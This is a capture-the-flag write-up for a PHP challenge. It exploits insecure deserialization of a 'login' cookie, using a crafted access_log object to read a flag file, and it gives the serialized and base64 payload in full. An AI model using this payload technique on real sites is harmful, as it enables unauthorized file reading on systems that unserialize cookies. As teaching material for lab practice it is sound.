# Super Serial

We have a sign in form. Try some username and password but I only get "Invalid Login." from the website.

Notice that we have something in `/robots.txt`:

`User-agent: *`
`Disallow: /admin.phps`

But nothing in `/admin.phps` or `/admin.php`. `.phps` is a hint for me. May be I can read some files that end with `phps`.

Therefore, I have source code of 3 files `index.phps, cookie.phps, authentication.phps`.

Look at this special block source code in `cookie.phps`:

```php
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
```

There is a cookie named `login` would be touched after our authenticate. This cookie is defined with `urlencode(base64_encode(serialize($perm_res)))`, where `$perm_res = new permissions($username, $password);`.

When we get an error with deserialization it will return `die("Deserialization error. ".$perm);`. Look at this `access_log` object:

```php
class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}
```

So, we can use `access_log` object to read the flag file `../flag` (in hint): Replace the value `$perm` with a new value, before encrypt:

`O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}`

After encrypt:

`TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9`

Add cookie `login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9` with path `/authentication.php` and `user=admin&pass=123` we will get the flag.
